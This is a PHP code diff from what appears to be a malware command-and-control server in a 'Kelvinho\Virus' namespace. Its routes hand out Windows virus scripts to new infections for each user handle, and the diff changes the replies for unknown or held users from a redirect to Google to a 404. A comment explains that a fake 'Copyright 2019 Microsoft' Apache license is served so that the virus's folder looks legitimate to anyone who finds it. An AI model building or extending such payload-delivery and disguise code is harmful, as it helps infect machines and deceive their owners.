@@ -8,8 +8,8 @@ use Kelvinho\Virus\User\UserFactory;
 use Kelvinho\Virus\Virus\VirusFactory;
 
 function newWin(string $user_handle, UserFactory $userFactory, VirusFactory $virusFactory) {
-    if (!User::exists($user_handle)) Header::redirectToGoogle();
-    if ($userFactory->get($user_handle)->isHold()) Header::redirectToGoogle();
+    if (!User::exists($user_handle)) Header::notFound();
+    if ($userFactory->get($user_handle)->isHold()) Header::notFound();
     $virus = $virusFactory->new($user_handle);
     echo BaseScriptWin::initStandalone($virus->getVirusId(), $user_handle);
     Header::ok();
@@ -23,8 +23,8 @@ $router->get("new/*", function () use ($requestData, $userFactory, $virusFactory
 });
 $router->get("new/win/*/entry/*", function () use ($requestData, $userFactory) {
     $user_handle = $requestData->getExplodedPath()[2];
-    if (!User::exists($user_handle)) Header::redirectToGoogle();
-    if ($userFactory->get($user_handle)->isHold()) Header::redirectToGoogle();
+    if (!User::exists($user_handle)) Header::notFound();
+    if ($userFactory->get($user_handle)->isHold()) Header::notFound();
     $virus_id = $requestData->getExplodedPath()[4];
     echo BaseScriptWin::simpleMain($virus_id);
     Header::ok();
@@ -32,8 +32,8 @@ $router->get("new/win/*/entry/*", function () use ($requestData, $userFactory) {
 //Dummy license text, to make anyone wanders into the virus's folder not suspicious of anything. TL;DR: make it looks legit
 $router->get("new/win/*/license", function () use ($requestData, $userFactory) {
     $user_handle = $requestData->getExplodedPath()[2];
-    if (!User::exists($user_handle)) Header::redirectToGoogle();
-    if ($userFactory->get($user_handle)->isHold()) Header::redirectToGoogle(); //@formatter:off ?>
+    if (!User::exists($user_handle)) Header::notFound();
+    if ($userFactory->get($user_handle)->isHold()) Header::notFound(); //@formatter:off ?>
 Copyright 2019 Microsoft
 
 Licensed under the Apache License, Version 2.0 (the "License");
